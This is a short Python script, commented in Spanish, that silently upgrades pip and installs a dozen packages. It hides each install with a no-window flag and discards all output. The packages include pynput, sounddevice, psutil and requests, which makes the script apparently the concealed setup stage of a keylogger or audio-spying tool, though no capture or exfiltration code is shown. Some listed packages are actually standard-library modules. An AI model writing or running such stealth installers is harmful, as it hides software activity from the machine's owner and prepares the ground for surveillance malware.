import subprocess
import time

# Función para ejecutar comandos en segundo plano y ocultos
def run_hidden_command(command):
    # Ejecuta el comando de forma oculta sin mostrar ninguna ventana ni salida
    subprocess.run(command, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Comandos para actualizar pip y instalar los paquetes
commands = [
    ["python", "-m", "pip", "install", "--upgrade", "pip"],
    ["python", "-m", "pip", "install", "sounddevice"],
    ["python", "-m", "pip", "install", "numpy"],
    ["python", "-m", "pip", "install", "ffmpeg"],
    ["python", "-m", "pip", "install", "tk"],
    ["python", "-m", "pip", "install", "psutil"],
    ["python", "-m", "pip", "install", "datetime"],
    ["python", "-m", "pip", "install", "logging"],
    ["python", "-m", "pip", "install", "wmic"],
    ["python", "-m", "pip", "install", "requests"],
    ["python", "-m", "pip", "install", "pynput"],
    ["python", "-m", "pip", "install", "pathlib"]
]

# Ejecutar todos los comandos en segundo plano
for command in commands:
    run_hidden_command(command)
    time.sleep(1)  # Esperar 1 segundo entre cada instalación (opcional)
